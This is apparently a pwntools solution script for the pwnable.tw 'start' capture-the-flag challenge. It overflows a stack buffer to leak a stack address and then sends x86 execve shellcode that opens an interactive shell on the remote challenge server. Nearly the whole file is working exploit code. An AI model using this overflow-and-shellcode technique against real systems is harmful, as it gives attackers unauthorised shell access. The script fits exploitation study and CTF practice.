from pwn import *

io = remote("chall.pwnable.tw", 10000)
context(arch = "i386", os = "linux", log_level = "debug")
# io = process("./start")
# gdb.attach(io, "b *0x804809c")

shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"

payload1 = 0x14*"A" + p32(0x804808b)
io.recv()
io.send(payload1)
io.recvuntil(p32(0x804808b))

execaddr = u32(io.recv(4)) - 0x14 - 0x8

payload = shellcode + (0x2c - len(shellcode)) * "\x90" + p32(execaddr)

io.send(payload)

io.interactive()